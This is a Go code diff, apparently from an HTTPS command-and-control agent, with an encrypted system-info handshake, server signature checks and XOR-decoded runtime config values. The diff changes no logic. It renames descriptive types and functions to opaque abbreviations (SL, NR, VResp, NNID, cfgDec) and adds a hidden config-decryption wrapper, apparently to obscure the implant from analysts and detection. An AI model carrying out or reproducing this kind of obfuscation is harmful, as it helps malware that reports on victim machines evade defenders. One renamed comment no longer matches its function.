@@ -95,17 +95,19 @@ func EncryptJSON(jsonStr string, secret string) (string, error) {
 	return EncryptAES([]byte(jsonStr), key)
 }
 
-// HybridEncryptedData represents our layered encryption structure
-type HybridEncryptedData struct {
-	// The AES key encrypted with RSA
-	EncryptedKey string `json:"ek"`
-	// The actual data encrypted with AES
-	EncryptedData string `json:"ed"`
+type SL struct {
+	EK string `json:"ek"`
+	ED string `json:"ed"`
 }
 
-// xorDecrypt decrypts a base64-encoded XOR-encrypted string using the given key
+// cfgDec decrypts a base64-encoded XOR-encrypted string using the given key
 // This matches the pattern used by HTTPS agents for runtime decryption
-func xorDecrypt(encoded, key string) (string, error) {
+func secVal(enc string) string {
+	v, _ := cfgDec(enc, cfgKey)
+	return v
+}
+
+func cfgDec(encoded, key string) (string, error) {
 	if encoded == "" || key == "" {
 		return "", fmt.Errorf(Err(E1))
 	}
@@ -125,7 +127,7 @@ func xorDecrypt(encoded, key string) (string, error) {
 }
 
 // encryptHandshakePayload encrypts the system info for the handshake
-func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret string) (string, error) {
+func encryptHandshakePayload(sysInfo *NR, publicKeyPEM, initSecret string) (string, error) {
 	// Marshal system info to JSON
 	sysInfoJSON, err := json.Marshal(sysInfo)
 	if err != nil {
@@ -175,11 +177,11 @@ func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret
 
 	// Create envelope
 	envelope := struct {
-		EncryptedKey  string `json:"ek"`
-		EncryptedData string `json:"ed"`
+		EK  string `json:"ek"`
+		ED string `json:"ed"`
 	}{
-		EncryptedKey:  base64.StdEncoding.EncodeToString(encryptedKey),
-		EncryptedData: base64.StdEncoding.EncodeToString(encryptedData),
+		EK:  base64.StdEncoding.EncodeToString(encryptedKey),
+		ED: base64.StdEncoding.EncodeToString(encryptedData),
 	}
 
 	envelopeJSON, err := json.Marshal(envelope)
@@ -191,7 +193,7 @@ func encryptHandshakePayload(sysInfo *SystemInfoReport, publicKeyPEM, initSecret
 }
 
 // verifyServerSignature verifies the server's RSA signature
-func verifyServerSignature(resp *SignedResponse, publicKeyPEM string) error {
+func verifyServerSignature(resp *VResp, publicKeyPEM string) error {
 	// Parse public key
 	block, _ := pem.Decode([]byte(publicKeyPEM))
 	if block == nil {
@@ -204,7 +206,7 @@ func verifyServerSignature(resp *SignedResponse, publicKeyPEM string) error {
 	}
 
 	// Recreate verification data
-	verificationData := fmt.Sprintf("%s:%s", resp.NewClientID, resp.Seed)
+	verificationData := fmt.Sprintf("%s:%s", resp.NNID, resp.Seed)
 	hashed := sha256.Sum256([]byte(verificationData))
 
 	// Decode signature
@@ -288,9 +290,9 @@ func EncryptInitialHandshake(jsonData string, secret string, pubKeyStr string) (
 	}
 
 	// Create the hybrid structure
-	hybrid := HybridEncryptedData{
-		EncryptedKey:  base64.StdEncoding.EncodeToString(encryptedKey),
-		EncryptedData: encodedData,
+	hybrid := SL{
+		EK:  base64.StdEncoding.EncodeToString(encryptedKey),
+		ED: encodedData,
 	}
 
 	// Convert to JSON
